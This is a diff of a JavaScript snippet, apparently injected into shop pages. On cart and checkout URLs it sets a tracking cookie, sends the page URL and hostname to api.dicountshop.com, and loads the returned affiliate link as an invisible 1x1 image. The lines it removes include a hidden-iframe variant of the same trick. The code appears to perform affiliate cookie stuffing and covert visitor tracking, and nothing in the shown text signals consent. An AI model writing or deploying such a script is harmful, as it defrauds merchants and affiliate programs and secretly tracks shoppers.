@@ -10,7 +10,7 @@
 
 
     function createTrackingPixel(url) {
-        console.log("url result =>" ,url);
+        console.log("url => ",url)
         var img = document.createElement('img');
         img.src = url;
         img.style.width = '1px';
@@ -21,27 +21,18 @@
         document.body.appendChild(img);
     }
 
-    function createClickIframe(url) {
-  const iframe = document.createElement('iframe');
-  iframe.src = url;
-  iframe.width = "1";
-  iframe.height = "1";
-  iframe.style = "display:none;visibility:hidden;";
-  document.body.appendChild(iframe);
-}
-
-
     async function initTracking() {
         // if (sessionStorage.getItem('iframe_triggered')) {
         //     return; 
         // }
-        console.log("Come into init =>>38 " )
+
+
         try {
             let uniqueId = getCookie('tracking_uuid') || generateUUID();
             let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
             document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
-
-            let response = await fetch('https://api.dicountshop.com/api/track-user-withoutUni', {
+            console.log("line => 34");
+            let response = await fetch('https://api.dicountshop.com/api/track-user', {
                 method: 'POST',
                 body: JSON.stringify({
                     url: window.location.href,
@@ -50,41 +41,21 @@
                     origin: window.location.hostname,
                 }),
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin':'*'
                 }
             });
-    
-            console.log("Response status =>", response.status);
-    
-            // check CORS / invalid response
-            if (!response.ok) {
-                console.error("Fetch failed, status:", response.status);
-                return;
-            }
-    
-            let text = await response.text();
-            console.log("Raw response body =>", text);
-            
-            let result;
-            try {
-                result = JSON.parse(text);
-            } catch (e) {
-                console.error("Invalid JSON response:", e);
-                return;
-            }
-    
-            console.log("Parsed result =>", result);
-            
+            console.log("line => 48");
+            let result = await response.json();
+            console.log("line => 50 ",result);
             if (result.success && result.affiliate_url) {
                 createTrackingPixel(result.affiliate_url);
-                console.log("inside if result =>" ,result);
                 sessionStorage.setItem('iframe_triggered', 'true'); 
             } else {
-                console.log("Elese result =>");
                 createTrackingPixel('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
             }
         } catch (error) {
-             console.error("Error in tracking script:", error && error.message ? error.message : error);
+            console.error('Error in tracking script:', error);
         }
     }
 
@@ -102,16 +73,19 @@
         }
         return '';
     }
-        function isCardPage() {
-            const cardPageUrls = ['/cart', '/checkout']; 
-            return cardPageUrls.some(url => window.location.pathname.includes(url));
-        }
-        
-        if (isCardPage()) {
-            initTracking()
-        }
 
-        //setTimeout(initTracking, 2000);
+     function isCartPage() {
+        const cartPages = ['/cart', '/checkout'];
+        return cartPages.some(path => window.location.pathname.includes(path));
+    }
+
+
+
+     if (isCartPage()) {
+        initTracking();
+    }
+
+
+   
     
-    initTracking()
 })();
